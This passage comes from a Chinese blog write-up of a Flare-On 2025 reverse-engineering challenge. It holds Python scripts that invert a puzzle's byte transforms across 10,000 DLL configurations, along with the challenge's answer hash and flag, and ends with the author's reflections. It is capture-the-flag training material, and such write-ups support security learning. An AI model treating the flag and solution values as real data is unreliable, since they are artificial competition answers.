&amp; <span class="number">1</span>) == <span class="number">0</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;K (derived from qkey) is even; inversion requires K odd. &quot;</span>)</span><br><span class="line">    inv_exp_mod = <span class="number">1</span> &lt;&lt; <span class="number">254</span></span><br><span class="line">    K_inv = <span class="built_in">pow</span>(K, -<span class="number">1</span>, inv_exp_mod)</span><br><span class="line">    out = <span class="built_in">bytearray</span>(output_bytes)</span><br><span class="line">    candidates = []</span><br><span class="line">    <span class="keyword">for</span> tag <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        R = <span class="built_in">bytearray</span>(out)</span><br><span class="line">        R[<span class="number">0</span>] ^= (tag ^ <span class="number">1</span>)</span><br><span class="line">        R_int = u256_from_bytes_le(R)</span><br><span class="line">        X_int = pow_mod_2_256(R_int, K_inv)</span><br><span class="line">        X_bytes = u256_to_bytes_le(X_int)</span><br><span class="line">        inp = <span class="built_in">bytearray</span>(X_bytes)</span><br><span class="line">        <span class="keyword">if</span> tag == <span class="number">0</span>: inp[<span class="number">0</span>] &amp;= <span class="number">0xFE</span></span><br><span class="line">        <span class="keyword">else</span>: inp[<span class="number">0</span>] |= <span class="number">0x01</span></span><br><span class="line">        candidates.append(<span class="built_in">bytes</span>(inp))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hamming_weight</span>(<span class="params">b</span>): <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">bin</span>(byte).count(<span class="string">&#x27;1&#x27;</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> b)</span><br><span class="line"></span><br><span class="line">    cand0, cand1 = candidates</span><br><span class="line">    <span class="keyword">if</span> hamming_weight(cand0) &gt;= hamming_weight(cand1): <span class="keyword">return</span> cand0</span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> cand1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_func_A_bytes</span>(<span class="params">out_bytes, qkey</span>):</span><br><span class="line">    sbox = n2ble(qkey, <span class="number">8</span>)</span><br><span class="line">    inv = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(sbox): inv[v] = i</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(inv[b] <span class="keyword">for</span> b <span class="keyword">in</span> out_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_func_B_bytes</span>(<span class="params">out_bytes, qkey</span>):</span><br><span class="line">    perm = n2ble(qkey, <span class="number">8</span>)[:<span class="number">32</span>]</span><br><span class="line">    inp = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>): inp[perm[i]] = out_bytes[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(inp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_check_full</span>(<span class="params">config_id, matrix_lines, my_id, func_to_dll, orders</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Reading const files for id:&quot;</span>, config_id)</span><br><span class="line">    mode, power, mcnt_file, encs = read_cnts_c(config_id)</span><br><span class="line">    qvals = solve_for_qs_direct(mode, power, mcnt_file, encs)</span><br><span class="line">    M_entries = [mcnt_file[i] ^ qvals[i % <span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">    M = Matrix([M_entries[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)])</span><br><span class="line">    R = matrix_pow_mod_sympy(M, power, mode)</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> R] != encs: <span class="built_in">print</span>(<span class="string">&quot;[!] verification failed: M^power != encs (mod mode)&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>: <span class="built_in">print</span>(<span class="string">&quot;[*] matrix verification ok&quot;</span>)</span><br><span class="line">    cur = n2ble(qvals, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cur) != <span class="number">32</span>: <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;constructed mid inp length != 32&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Recovered intermediate bytes:&quot;</span>, cur.<span class="built_in">hex</span>())</span><br><span class="line">    cfg = read_config_txt(config_id)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Loaded %d config steps&quot;</span> % <span class="built_in">len</span>(cfg))</span><br><span class="line">    <span class="keyword">for</span> step_idx, (func_name, typ, qkey) <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">reversed</span>(cfg)):</span><br><span class="line">        func_name = cfg[<span class="built_in">len</span>(cfg) - <span class="number">1</span> - step_idx][<span class="number">0</span>]</span><br><span class="line">        tagkey = compute_func_tagkey(func_name, func_to_dll, matrix_lines, my_id, orders)</span><br><span class="line">        <span class="keyword">if</span> typ == <span class="string">&quot;A&quot;</span>:</span><br><span class="line">            tmp = <span class="built_in">bytearray</span>(inv_func_A_bytes(cur, qkey))</span><br><span class="line">            <span class="keyword">assert</span> func_A(tmp.copy(), qkey) == cur</span><br><span class="line">            xor_first_dword(tmp, tagkey)</span><br><span class="line">            cur = tmp</span><br><span class="line">        <span class="keyword">elif</span> typ == <span class="string">&quot;B&quot;</span>:</span><br><span class="line">            tmp = <span class="built_in">bytearray</span>(inv_func_B_bytes(cur, qkey))</span><br><span class="line">            <span class="keyword">assert</span> func_B(tmp.copy(), qkey) == cur</span><br><span class="line">            xor_first_dword(tmp, tagkey)</span><br><span class="line">            cur = tmp</span><br><span class="line">        <span class="keyword">elif</span> typ == <span class="string">&quot;C&quot;</span>:</span><br><span class="line">            tmp = <span class="built_in">bytearray</span>(inv_func_C_bytes(cur, qkey))</span><br><span class="line">            <span class="keyword">assert</span> func_C(tmp.copy(), qkey) == cur</span><br><span class="line">            xor_first_dword(tmp, tagkey)</span><br><span class="line">            cur = tmp</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unknown type in config: &quot;</span> + <span class="built_in">str</span>(typ))</span><br><span class="line">        <span class="comment"># print(cur.hex(), tagkey)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Done.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> cur</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python re_check.py &lt;id&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    cfg_id = sys.argv[<span class="number">1</span>].zfill(<span class="number">4</span>)</span><br><span class="line">    my_id = <span class="built_in">int</span>(cfg_id)</span><br><span class="line">    script_dir = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">    orders_path = os.path.join(script_dir, <span class="string">&quot;order.txt&quot;</span>)</span><br><span class="line">    matrix_path = os.path.join(script_dir, <span class="string">&quot;matrix.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(orders_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f: orders = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(matrix_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f: matrix_lines = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line">    func_to_dll = load_func_name_to_dll_map(<span class="string">&quot;exported_functions.db&quot;</span>)</span><br><span class="line">    res = reverse_check_full(cfg_id, matrix_lines, my_id, func_to_dll, orders)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Recovered (hex):&quot;</span>, res.<span class="built_in">hex</span>())</span><br><span class="line">    license_path = os.path.join(script_dir, <span class="string">&quot;license.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(license_path, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f: f.write(cfg_id + <span class="string">&quot;\t&quot;</span> + res.<span class="built_in">hex</span>() + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>解得0000.dll在位置0的明文是<font color=lime><strong>27fccd48105201db4cf5fb642b9456be2db4016839d67ee6a1aee9330dfebcef</strong></font>，带入验证发现正确，即逆向成功</p>
<h2 id="9-6-自动化求解"><a href="#9-6-自动化求解" class="headerlink" title="#9.6 自动化求解"></a>#9.6 自动化求解</h2><p>编写总控脚本，先手动复制文件夹并提取所有常量（同路径会导致线程竞争）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line">PSUTIL_AVAILABLE = <span class="literal">False</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> psutil</span><br><span class="line">    PSUTIL_AVAILABLE = <span class="literal">True</span></span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">EXTRACT_SCRIPT = os.path.join(BASE_DIR, <span class="string">&quot;extract_const_sqlite.py&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_high_priority</span>():</span><br><span class="line">    system = platform.system()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> system == <span class="string">&quot;Windows&quot;</span> <span class="keyword">and</span> PSUTIL_AVAILABLE:</span><br><span class="line">            p = psutil.Process()</span><br><span class="line">            p.nice(psutil.HIGH_PRIORITY_CLASS)</span><br><span class="line">    <span class="keyword">except</span> (OSError, PermissionError, AttributeError) <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[WARN] Failed to set high priority: <span class="subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_single</span>(<span class="params">id_str</span>):</span><br><span class="line">    cmd = [sys.executable, EXTRACT_SCRIPT, id_str]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proc = subprocess.Popen(</span><br><span class="line">            cmd,</span><br><span class="line">            cwd=BASE_DIR,</span><br><span class="line">            stdout=sys.stdout,</span><br><span class="line">            stderr=sys.stderr,</span><br><span class="line">            universal_newlines=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        proc.wait()</span><br><span class="line">        <span class="keyword">if</span> proc.returncode != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[ERROR] extract_const.py <span class="subst">&#123;id_str&#125;</span> exited with code <span class="subst">&#123;proc.returncode&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[EXCEPTION] Failed to run <span class="subst">&#123;id_str&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting single-threaded extract_const.py for IDs 0000–9999 with high CPU priority...&quot;</span>, file=sys.stderr)</span><br><span class="line">    set_high_priority()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(范围):</span><br><span class="line">        id_str = <span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[INFO] Processing ID: <span class="subst">&#123;id_str&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        run_single(id_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>以及check中的常量：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">SCRIPT_NAME = <span class="string">&quot;extract_const_check.py&quot;</span></span><br><span class="line">TOTAL = <span class="number">10000</span></span><br><span class="line">MAX_WORKERS = <span class="number">32</span></span><br><span class="line">TIMEOUT = <span class="number">60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_single</span>(<span class="params">id_int</span>):</span><br><span class="line">    id_str = <span class="string">f&quot;<span class="subst">&#123;id_int:04d&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.run(</span><br><span class="line">            [sys.executable, SCRIPT_NAME, id_str],</span><br><span class="line">            capture_output=<span class="literal">True</span>,</span><br><span class="line">            text=<span class="literal">True</span>,</span><br><span class="line">            timeout=TIMEOUT</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> id_str, result.returncode == <span class="number">0</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="keyword">return</span> id_str, <span class="literal">False</span>, <span class="string">&quot;timeout&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> id_str, <span class="literal">False</span>, <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(SCRIPT_NAME):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error: <span class="subst">&#123;SCRIPT_NAME&#125;</span> not found in current directory.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Starting batch execution with <span class="subst">&#123;MAX_WORKERS&#125;</span> threads (IDs 0000–9999)...&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=MAX_WORKERS) <span class="keyword">as</span> executor:</span><br><span class="line">        future_to_id = &#123;</span><br><span class="line">            executor.submit(run_single, i): i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(TOTAL)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">with</span> tqdm(total=TOTAL, desc=<span class="string">&quot;Processing&quot;</span>, unit=<span class="string">&quot;id&quot;</span>) <span class="keyword">as</span> pbar:</span><br><span class="line">            <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(future_to_id):</span><br><span class="line">                <span class="comment"># print(future.result())</span></span><br><span class="line">                pbar.update(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Batch finished!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>然后再调用总求解脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"></span><br><span class="line">TOTAL_IDS = <span class="number">10000</span></span><br><span class="line">MAX_WORKERS = <span class="number">32</span></span><br><span class="line">SCRIPT = <span class="string">&quot;re_check.py&quot;</span></span><br><span class="line">BASE_DIR = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">CONSTS_DIR = os.path.join(BASE_DIR, <span class="string">&quot;consts&quot;</span>)</span><br><span class="line">progress_lock = Lock()</span><br><span class="line">completed_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_id</span>(<span class="params">id_str</span>):</span><br><span class="line">    <span class="keyword">global</span> completed_count</span><br><span class="line">    expected_input = os.path.join(CONSTS_DIR, <span class="string">f&quot;<span class="subst">&#123;id_str&#125;</span>.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(expected_input):</span><br><span class="line">        <span class="keyword">with</span> progress_lock: completed_count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SKIP] <span class="subst">&#123;id_str&#125;</span>: <span class="subst">&#123;expected_input&#125;</span> not found&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = [sys.executable, os.path.join(BASE_DIR, SCRIPT), id_str]</span><br><span class="line">        proc = subprocess.Popen(</span><br><span class="line">            cmd,</span><br><span class="line">            cwd=BASE_DIR,</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            text=<span class="literal">True</span>,</span><br><span class="line">            bufsize=<span class="number">1</span>,</span><br><span class="line">            universal_newlines=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        prefix = <span class="string">f&quot;[<span class="subst">&#123;id_str&#125;</span>] &quot;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">iter</span>(proc.stdout.readline, <span class="string">&#x27;&#x27;</span>): <span class="built_in">print</span>(prefix + line.rstrip(), flush=<span class="literal">True</span>)</span><br><span class="line">        proc.wait()</span><br><span class="line">        <span class="keyword">with</span> progress_lock:</span><br><span class="line">            completed_count += <span class="number">1</span></span><br><span class="line">            current = completed_count</span><br><span class="line">        <span class="keyword">if</span> proc.returncode == <span class="number">0</span>: <span class="built_in">print</span>(<span class="string">f&quot;[INFO] <span class="subst">&#123;id_str&#125;</span>: succeeded (progress: <span class="subst">&#123;current&#125;</span>/<span class="subst">&#123;TOTAL_IDS&#125;</span>)&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="keyword">else</span>: <span class="built_in">print</span>(<span class="string">f&quot;[ERROR] <span class="subst">&#123;id_str&#125;</span>: failed (rc=<span class="subst">&#123;proc.returncode&#125;</span>, progress: <span class="subst">&#123;current&#125;</span>/<span class="subst">&#123;TOTAL_IDS&#125;</span>)&quot;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">with</span> progress_lock:</span><br><span class="line">            completed_count += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[EXCEPTION] <span class="subst">&#123;id_str&#125;</span>: <span class="subst">&#123;e&#125;</span> (progress: <span class="subst">&#123;completed_count&#125;</span>/<span class="subst">&#123;TOTAL_IDS&#125;</span>)&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ids = [<span class="string">f&quot;<span class="subst">&#123;i:04d&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(TOTAL_IDS)]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Starting <span class="subst">&#123;MAX_WORKERS&#125;</span>-threaded processing of <span class="subst">&#123;<span class="built_in">len</span>(ids)&#125;</span> IDs (0000–9999) using only &#x27;<span class="subst">&#123;SCRIPT&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Will skip any ID without existing <span class="subst">&#123;os.path.join(<span class="string">&#x27;consts&#x27;</span>, <span class="string">&#x27;&lt;id&gt;.txt&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">global</span> completed_count</span><br><span class="line">    completed_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=MAX_WORKERS) <span class="keyword">as</span> executor:</span><br><span class="line">        futures = &#123;executor.submit(process_id, id_str): id_str <span class="keyword">for</span> id_str <span class="keyword">in</span> ids&#125;</span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">            id_str = futures[future]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                future.result()</span><br><span class="line">            <span class="keyword">except</span> Exception: <span class="keyword">pass</span></span><br><span class="line">    elapsed = time.time() - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\nAll <span class="subst">&#123;<span class="built_in">len</span>(ids)&#125;</span> IDs processed in <span class="subst">&#123;elapsed:<span class="number">.2</span>f&#125;</span> seconds.&quot;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>哈希：<font color=lime><strong>600abf28e03c73471a73bb909210dc2d2b4e98c7577d6b71299d2e54d693d14d</strong></font></p>
<p><font color=deepskyblue><strong><a href="mailto:&#x49;&#116;&#x73;&#x5f;&#108;&#x31;&#107;&#x65;&#95;&#49;&#48;&#x30;&#48;&#x30;&#95;&#x73;&#x70;&#111;&#111;&#79;&#x30;&#111;&#x30;&#x4f;&#48;&#111;&#79;&#x6f;&#x30;&#x6f;&#48;&#x4f;&#48;&#79;&#x30;&#x4f;&#x6f;&#79;&#111;&#x4f;&#x4f;&#x4f;&#48;&#48;&#111;&#x30;&#x6f;&#x30;&#79;&#x6f;&#x6f;&#x6e;&#x73;&#x40;&#x66;&#x6c;&#x61;&#x72;&#101;&#x2d;&#x6f;&#110;&#46;&#99;&#x6f;&#x6d;">Its_l1ke_10000_spooO0o0O0oOo0o0O0O0OoOoOOO00o0o0Ooons@flare-on.com</a></strong></font></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a><center><small>结语</small></center></h1><p>虽然自己已经经历过不少国际赛<del>小众又独特的</del>题目的洗礼，但Flare-On的不少题目仍让我感觉耳目一新，在传统单调的解密&#x2F;约束型逆向的基础上融合了不少其他方向的知识<del>或者出题人的小巧思（比如第三题的伪PDF）</del>，而不局限于传统的分析逻辑-正向同构-逆向解密的线性形式。大部分题目也都可以或多或少地学到新东西，练习新的思路和解题方式（比如第7题的自动解混淆和第9题的自动化逆向等）。9个题的难度梯度逐级递进，与闯关的比赛形式相得益彰，从前几个题的“分钟级”难度，到第4、5、7、8题的“小时级”难度，再到最后的第9题的“天级”难度，让我<del>这种喜欢赤石的人</del>觉得打起来是一种享受而非坐牢（<del>真的吗？</del>）。今年的难关已经悉数攻克，明年继续来战！</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/10/28/xctf_2025_riir/"
      title="XCTF 9th Final Reverse-Rewrite It In Rust WriteUp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        XCTF 9th Final Reverse-Rewrite It In Rust WriteUp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2025/09/23/crew_25_wasm/"
      title="crewCTF 2025 Reverse-WASM Vault WriteUp"
     >

    <p class="title-text">
      
        crewCTF 2025 Reverse-WASM Vault WriteUp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2026 Astral Prisma<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
